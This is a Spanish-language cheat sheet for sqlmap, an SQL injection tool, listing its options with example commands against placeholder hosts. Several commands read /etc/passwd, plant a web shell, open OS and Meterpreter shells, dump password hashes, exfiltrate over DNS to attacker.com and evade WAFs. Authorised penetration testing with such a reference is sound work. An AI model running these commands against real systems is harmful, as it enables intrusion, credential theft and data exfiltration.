sqlmap es una herramienta de código abierto para la detección y explotación automática de vulnerabilidades de inyección SQL en aplicaciones web. Soporta todas las técnicas principales de SQLi (blind booleana, basada en tiempo, basada en error, UNION, stacked queries) y permite enumerar bases de datos, extraer datos, leer y escribir ficheros en el servidor, y ejecutar comandos en el sistema operativo a través del backend de base de datos.

```
sqlmap -u <URL> [opciones]
sqlmap -r <request_file> [opciones]
```

---

## Especificación de objetivo

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `-u <URL>` / `--url=<URL>` | URL objetivo. Parámetros GET en la URL. | `sqlmap -u "http://target.com/page?id=1"` |
| `-r <archivo>` | Lee la petición HTTP completa desde un archivo (capturada con Burp). | `sqlmap -r request.txt` |
| `-g <Google Dork>` | Usa un dork de Google para obtener objetivos. | `sqlmap -g "inurl:index.php?id="` |
| `--url-encode` | URL-encodifica los payloads. | `sqlmap -u "..." --url-encode` |
| `-m <archivo>` | Procesa múltiples URLs desde un archivo. | `sqlmap -m urls.txt` |
| `--wizard` | Modo interactivo guiado para principiantes. | `sqlmap --wizard` |

---

## Configuración de la petición HTTP

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `--data=<datos>` | Datos POST a enviar en el cuerpo de la petición. | `sqlmap -u "http://target.com/login" --data="user=admin&pass=123"` |
| `--cookie=<cookie>` | Define la cabecera Cookie de la sesión autenticada. | `sqlmap -u "..." --cookie="PHPSESSID=abc123"` |
| `--drop-set-cookie` | Ignora las cabeceras `Set-Cookie` de las respuestas. | `sqlmap -u "..." --drop-set-cookie` |
| `--random-agent` | Usa un User-Agent aleatorio en cada petición. | `sqlmap -u "..." --random-agent` |
| `--user-agent=<ua>` | Define un User-Agent personalizado. | `sqlmap -u "..." --user-agent="Mozilla/5.0"` |
| `-H <cabecera>` / `--header=<cabecera>` | Añade cabeceras HTTP personalizadas. | `sqlmap -u "..." -H "X-Forwarded-For: 127.0.0.1"` |
| `--headers=<cabeceras>` | Múltiples cabeceras separadas por `\n`. | `sqlmap -u "..." --headers="Accept: */*\nReferer: http://target.com"` |
| `--method=<método>` | Método HTTP (GET, POST, PUT, etc.). | `sqlmap -u "..." --method=PUT` |
| `--auth-type=<tipo>` | Tipo de autenticación HTTP: `Basic`, `Digest`, `NTLM`, `PKI`. | `sqlmap -u "..." --auth-type=Basic --auth-cred="admin:pass"` |
| `--auth-cred=<usuario:pass>` | Credenciales HTTP para autenticación. | `sqlmap -u "..." --auth-type=Basic --auth-cred="user:pass"` |
| `--ignore-code=<código>` | Ignora códigos de respuesta HTTP específicos. | `sqlmap -u "..." --ignore-code=401` |
| `--force-ssl` | Fuerza el uso de HTTPS. | `sqlmap -u "..." --force-ssl` |

---

## Parámetros de inyección

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `-p <param>` | Parámetro específico a testear. | `sqlmap -u "http://target.com?id=1&cat=2" -p id` |
| `--skip=<params>` | Omite los parámetros indicados. | `sqlmap -u "..." --skip="token,csrf"` |
| `--dbms=<DBMS>` | Fuerza el tipo de base de datos: `MySQL`, `PostgreSQL`, `MSSQL`, `Oracle`, `SQLite`, `Access`, etc. | `sqlmap -u "..." --dbms=MySQL` |
| `--os=<OS>` | Fuerza el sistema operativo del servidor: `Linux`, `Windows`. | `sqlmap -u "..." --os=Linux` |
| `--invalid-bignum` | Usa valores grandes inválidos para detección. | `sqlmap -u "..." --invalid-bignum` |
| `--invalid-logical` | Usa expresiones lógicas inválidas para detección. | `sqlmap -u "..." --invalid-logical` |
| `--prefix=<prefijo>` | Prefijo a añadir al payload de inyección. | `sqlmap -u "..." --prefix="'"` |
| `--suffix=<sufijo>` | Sufijo a añadir al payload. | `sqlmap -u "..." --suffix="--"` |
| `--tamper=<script>` | Aplica scripts de ofuscación/tamper al payload. Se pueden encadenar con `,`. | `sqlmap -u "..." --tamper=space2comment,charencode` |
| `--no-cast` | Deshabilita el cast de tipos en los payloads. | `sqlmap -u "..." --no-cast` |
| `--no-escape` | Deshabilita el escape de strings. | `sqlmap -u "..." --no-escape` |
| `--string=<str>` | Cadena presente en la respuesta cuando la condición es verdadera (blind booleana). | `sqlmap -u "..." --string="Welcome"` |
| `--not-string=<str>` | Cadena presente cuando la condición es falsa. | `sqlmap -u "..." --not-string="Invalid"` |
| `--regexp=<regex>` | Regex que debe coincidir en la respuesta verdadera. | `sqlmap -u "..." --regexp="logged in"` |
| `--code=<código>` | Código HTTP que indica respuesta verdadera. | `sqlmap -u "..." --code=200` |

---

## Técnicas de detección e intensidad

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `--level=<1-5>` | Nivel de profundidad del test (1=básico, 5=completo). Afecta qué parámetros y cabeceras se testean. | `sqlmap -u "..." --level=5` |
| `--risk=<1-3>` | Riesgo del payload (1=seguro, 3=destructivo). Nivel 3 incluye UPDATE/DELETE. | `sqlmap -u "..." --risk=2` |
| `--technique=<BEUSTQ>` | Técnicas a usar: `B`=Boolean, `E`=Error-based, `U`=UNION, `S`=Stacked, `T`=Time-based, `Q`=Inline query. | `sqlmap -u "..." --technique=BEUST` |
| `--time-sec=<n>` | Segundos de retardo para time-based blind (por defecto: 5). | `sqlmap -u "..." --time-sec=3` |
| `--union-cols=<rango>` | Rango de columnas para UNION-based (ej: `1-20`). | `sqlmap -u "..." --union-cols=1-20` |
| `--union-char=<char>` | Carácter NULL alternativo para UNION. | `sqlmap -u "..." --union-char=1` |
| `--union-from=<tabla>` | Tabla a usar en el FROM del UNION (para dbs sin tabla dual). | `sqlmap -u "..." --union-from=users` |
| `--dns-domain=<dominio>` | Dominio para exfiltración DNS (requiere servidor DNS propio). | `sqlmap -u "..." --dns-domain=attacker.com` |
| `--second-url=<URL>` | URL donde aparece el resultado (second-order injection). | `sqlmap -u "..." --second-url="http://target.com/profile"` |
| `--forms` | Detecta y prueba automáticamente los formularios HTML de la página. | `sqlmap -u "http://target.com/login" --forms` |

---

## Enumeración

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `-b` / `--banner` | Obtiene el banner del DBMS. | `sqlmap -u "..." -b` |
| `--current-user` | Obtiene el usuario actual del DBMS. | `sqlmap -u "..." --current-user` |
| `--current-db` | Obtiene la base de datos actual en uso. | `sqlmap -u "..." --current-db` |
| `--hostname` | Obtiene el hostname del servidor de base de datos. | `sqlmap -u "..." --hostname` |
| `--is-dba` | Comprueba si el usuario actual tiene privilegios DBA. | `sqlmap -u "..." --is-dba` |
| `--users` | Enumera los usuarios del DBMS. | `sqlmap -u "..." --users` |
| `--passwords` | Enumera y descifra los hashes de contraseñas de usuarios. | `sqlmap -u "..." --passwords` |
| `--privileges` | Enumera los privilegios de usuarios. | `sqlmap -u "..." --privileges` |
| `--roles` | Enumera los roles de usuarios (Oracle). | `sqlmap -u "..." --roles` |
| `--dbs` | Enumera todas las bases de datos accesibles. | `sqlmap -u "..." --dbs` |
| `-D <db>` | Selecciona una base de datos específica. | `sqlmap -u "..." -D webapp` |
| `--tables` | Enumera las tablas de la base de datos. | `sqlmap -u "..." -D webapp --tables` |
| `-T <tabla>` | Selecciona una tabla específica. | `sqlmap -u "..." -D webapp -T users` |
| `--columns` | Enumera las columnas de una tabla. | `sqlmap -u "..." -D webapp -T users --columns` |
| `-C <columnas>` | Selecciona columnas específicas (separadas por coma). | `sqlmap -u "..." -D webapp -T users -C username,password` |
| `--count` | Muestra el número de registros de cada tabla. | `sqlmap -u "..." -D webapp --count` |
| `--dump` | Extrae datos de una tabla. | `sqlmap -u "..." -D webapp -T users --dump` |
| `--dump-all` | Extrae datos de todas las tablas de todas las bases de datos. | `sqlmap -u "..." --dump-all` |
| `--exclude-sysdbs` | Excluye bases de datos del sistema al usar `--dump-all`. | `sqlmap -u "..." --dump-all --exclude-sysdbs` |
| `--where=<condición>` | Condición WHERE para filtrar datos en `--dump`. | `sqlmap -u "..." -D webapp -T users --dump --where="id>10"` |
| `--start=<n>` | Primer registro a extraer en `--dump`. | `sqlmap -u "..." -T users --dump --start=1 --stop=10` |
| `--stop=<n>` | Último registro a extraer. | `sqlmap -u "..." -T users --dump --stop=100` |
| `--schema` | Enumera el esquema completo de la base de datos. | `sqlmap -u "..." --schema` |
| `--search` | Busca columnas o tablas por nombre (requiere `-C`, `-T` o `-D`). | `sqlmap -u "..." --search -C password` |
| `--sql-query=<query>` | Ejecuta una consulta SQL arbitraria. | `sqlmap -u "..." --sql-query="SELECT version()"` |
| `--sql-shell` | Abre una shell SQL interactiva. | `sqlmap -u "..." --sql-shell` |

---

## Acceso al sistema de ficheros

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `--file-read=<ruta>` | Lee un fichero del servidor (requiere privilegios FILE). | `sqlmap -u "..." --file-read="/etc/passwd"` |
| `--file-write=<local>` | Escribe un fichero local en el servidor. | `sqlmap -u "..." --file-write="shell.php" --file-dest="/var/www/html/shell.php"` |
| `--file-dest=<remota>` | Ruta de destino en el servidor para `--file-write`. | `sqlmap -u "..." --file-write="cmd.php" --file-dest="/var/www/shell.php"` |

---

## Ejecución de comandos OS

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `--os-cmd=<cmd>` | Ejecuta un único comando en el sistema operativo. | `sqlmap -u "..." --os-cmd="whoami"` |
| `--os-shell` | Abre una shell interactiva en el sistema operativo. | `sqlmap -u "..." --os-shell` |
| `--os-pwn` | Establece un canal OOB (Meterpreter/VNC) para control remoto. | `sqlmap -u "..." --os-pwn` |
| `--os-smbrelay` | Ataque SMB relay one-click. | `sqlmap -u "..." --os-smbrelay` |
| `--os-bof` | Explota un buffer overflow en el procedimiento almacenado `sp_replwritetovarbin` de MSSQL. | `sqlmap -u "..." --os-bof` |
| `--priv-esc` | Intenta escalada de privilegios en la base de datos. | `sqlmap -u "..." --priv-esc` |

---

## Proxy y red

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `--proxy=<URL>` | Envía las peticiones a través de un proxy HTTP/HTTPS/SOCKS. | `sqlmap -u "..." --proxy="http://127.0.0.1:8080"` |
| `--proxy-cred=<user:pass>` | Credenciales para el proxy. | `sqlmap -u "..." --proxy="..." --proxy-cred="user:pass"` |
| `--proxy-file=<archivo>` | Lista de proxies a rotar. | `sqlmap -u "..." --proxy-file=proxies.txt` |
| `--tor` | Usa la red Tor como proxy. | `sqlmap -u "..." --tor` |
| `--tor-port=<puerto>` | Puerto del proxy Tor (por defecto: 9050 Socks5, 8123 Polipo). | `sqlmap -u "..." --tor --tor-port=9050` |
| `--tor-type=<tipo>` | Tipo de proxy Tor: `SOCKS4`, `SOCKS5`, `HTTP`. | `sqlmap -u "..." --tor --tor-type=SOCKS5` |
| `--check-tor` | Verifica que la conexión Tor funciona correctamente. | `sqlmap -u "..." --tor --check-tor` |

---

## Evasión y ofuscación (tamper scripts)

| Script | Descripción |
|--------|-------------|
| `space2comment` | Reemplaza espacios con comentarios `/**/`. |
| `charencode` | URL-encodes los caracteres del payload. |
| `between` | Reemplaza `>` con `NOT BETWEEN 0 AND`. |
| `randomcase` | Aleatoriza mayúsculas/minúsculas de palabras SQL. |
| `equaltolike` | Reemplaza `=` con `LIKE`. |
| `greatest` | Reemplaza `>` con `GREATEST`. |
| `ifnull2ifisnull` | Reemplaza `IFNULL` con `IF(ISNULL(...))`. |
| `modsecurityversioned` | Añade comentarios con versión para MySQL WAFs. |
| `apostrophemask` | Reemplaza comillas con su representación UTF-8. |
| `base64encode` | Codifica el payload en Base64. |
| `chardoubleencode` | Double URL-encodes el payload. |

```bash
# Ejemplo con múltiples tampers encadenados
sqlmap -u "..." --tamper=space2comment,charencode,randomcase
```

---

## Rendimiento

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `--threads=<n>` | Número de hilos concurrentes (por defecto: 1). Máximo recomendado: 10. | `sqlmap -u "..." --threads=5` |
| `--delay=<n>` | Segundos de retardo entre cada petición HTTP. | `sqlmap -u "..." --delay=1` |
| `--timeout=<n>` | Timeout en segundos por petición (por defecto: 30). | `sqlmap -u "..." --timeout=10` |
| `--retries=<n>` | Número de reintentos ante conexiones fallidas (por defecto: 3). | `sqlmap -u "..." --retries=5` |
| `--randomize=<param>` | Aleatoriza el valor de un parámetro en cada petición. | `sqlmap -u "..." --randomize=id` |
| `--safe-url=<URL>` | URL a visitar regularmente para mantener la sesión activa. | `sqlmap -u "..." --safe-url="http://target.com/home"` |
| `--safe-post=<datos>` | Datos POST para la URL segura. | `sqlmap -u "..." --safe-post="action=keep_alive"` |
| `--safe-req=<archivo>` | Petición HTTP segura desde archivo. | `sqlmap -u "..." --safe-req=keepalive.txt` |
| `--safe-freq=<n>` | Frecuencia de visita a la URL segura (cada N peticiones). | `sqlmap -u "..." --safe-freq=10` |

---

## Output y control general

| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `-v <0-6>` | Nivel de verbosidad (0=silencioso, 6=debug completo con payloads HTTP). | `sqlmap -u "..." -v 3` |
| `--batch` | Modo no interactivo: responde automáticamente con el valor por defecto a todas las preguntas. | `sqlmap -u "..." --batch` |
| `--answers=<respuestas>` | Respuestas automáticas a preguntas específicas. | `sqlmap -u "..." --answers="follow=Y"` |
| `--output-dir=<dir>` | Directorio de salida personalizado. | `sqlmap -u "..." --output-dir=/tmp/sqlmap_out` |
| `--flush-session` | Limpia los datos de sesión almacenados para el objetivo. | `sqlmap -u "..." --flush-session` |
| `--fresh-queries` | Descarta los resultados en caché y re-ejecuta las consultas. | `sqlmap -u "..." --fresh-queries` |
| `--save=<archivo>` | Guarda las opciones usadas en un archivo de configuración INI. | `sqlmap -u "..." --save=config.ini` |
| `-c <archivo>` | Carga opciones desde un archivo de configuración INI. | `sqlmap -c config.ini` |
| `--purge` | Elimina todos los datos de sesión del directorio de salida. | `sqlmap --purge` |

---

## Casos de uso comunes

```bash
# Detección básica en parámetro GET
sqlmap -u "http://target.com/item?id=5" --batch --dbs

# Extracción completa de una tabla con Burp request
sqlmap -r burp_request.txt -D webapp -T users --dump --batch

# Test de formulario de login (POST)
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs --batch

# Con autenticación de sesión y proxy Burp
sqlmap -u "http://target.com/api?id=1" --cookie="session=TOKEN" --proxy="http://127.0.0.1:8080" -v 3

# Evasión de WAF con tampers
sqlmap -u "http://target.com/item?id=1" --tamper=space2comment,charencode --random-agent --batch

# Lectura de fichero del servidor
sqlmap -u "http://target.com/item?id=1" --file-read="/etc/passwd" --batch

# Shell OS tras explotación
sqlmap -u "http://target.com/item?id=1" --os-shell --batch

# Búsqueda de columnas con "password" en todas las bases de datos
sqlmap -u "http://target.com/item?id=1" --search -C password --batch
```
